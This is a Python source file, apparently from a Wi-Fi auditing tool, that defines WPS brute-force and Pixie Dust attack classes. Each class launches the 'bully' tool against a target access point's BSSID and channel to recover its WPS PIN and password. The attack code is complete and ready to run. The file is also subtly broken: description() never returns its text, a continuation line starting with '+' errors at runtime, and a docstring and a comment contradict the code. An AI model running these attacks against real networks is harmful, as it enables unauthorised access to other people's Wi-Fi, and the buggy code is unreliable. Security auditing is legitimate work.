import sys
from Model.Attacks.AbstractAttack import AbstractAttack, AttackResultInfo
import subprocess as sb

class WPSBruteForceAttack(AbstractAttack):

    @classmethod
    def attack_name(cls) -> str:
        return 'WPS Brute Force'

    @classmethod
    def description(cls, result: bool) -> str:
        desc = ""
        if result:
            desc += "PIN have been recovered, your password can also be recovered with the PIN found. "
        else:
            desc += "PIN could not be recovered, AP has some kind of protection against brute force. However, "
            + "PIN could still be recovered by reducing the amount of tries per minute, WPS should be disabled"


    @classmethod
    def execute_attack(cls, q, kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-v', '4'] #verbose lvl 2

        result = AttackResultInfo(attack=cls.attack_name)
    
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)
        for line in p.stdout:
            q.put(line)
            #TODO show result, this never ends.

        

class PixieDustAttack(AbstractAttack):

    @classmethod
    def attack_name(cls) -> str:
        return 'Pixie Dust'

    @classmethod
    def execute_attack(cls, q, kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-d', #pixie dust
            '-v', '2'] #verbose lvl 2

        result = AttackResultInfo(attack=cls.attack_name)
        
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)
        for line in p.stdout:
            q.put(line)
            #TODO show result        